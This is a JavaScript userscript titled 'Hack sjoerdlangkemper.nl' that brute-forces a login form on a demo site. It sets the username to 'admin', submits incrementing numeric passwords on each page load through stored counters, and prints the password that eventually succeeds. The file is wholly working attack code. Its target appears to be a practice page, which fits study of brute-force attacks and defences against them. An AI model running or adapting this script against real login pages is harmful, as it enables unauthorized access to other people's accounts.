# desomn.js
// ==UserScript==
// @namespace    https://www.sjoerdlangkemper.nl/
// @name         Hack sjoerdlangkemper.nl
// @description  Brute-force a login page
// @copyright    2018, bam000055 (https://openuserjs.org//users/bam000055)
// @license      MIT
// @version      0.1
// @include        http://demo.sjoerdlangkemper.nl/login.php
// @grant        GM_setValue
// @grant        GM_getValue
// ==/UserScript==

// ==OpenUser JS==
// @author bam000055
// ==/OpenUser JS==


(function() {
    'use strict';

    let usernameElem = document.getElementById('username');
    if (usernameElem) {
        usernameElem.value = 'admin';

        let passwordElem = document.getElementById('password');

        let counter = GM_getValue('counter', 0);
        counter += 1;
        passwordElem.value = counter;
        GM_setValue('counter', counter);

        document.getElementsByTagName('form')[0].submit();
    } else {
        console.log('The password is ' + GM_getValue('counter'));

        let buttonElem = document.createElement('button');
        buttonElem.innerHTML = 'restart';
        buttonElem.addEventListener('click', function() {
            GM_setValue('counter', 0);
            window.location = window.location.href;
        });
        document.body.appendChild(buttonElem);
    }
})();
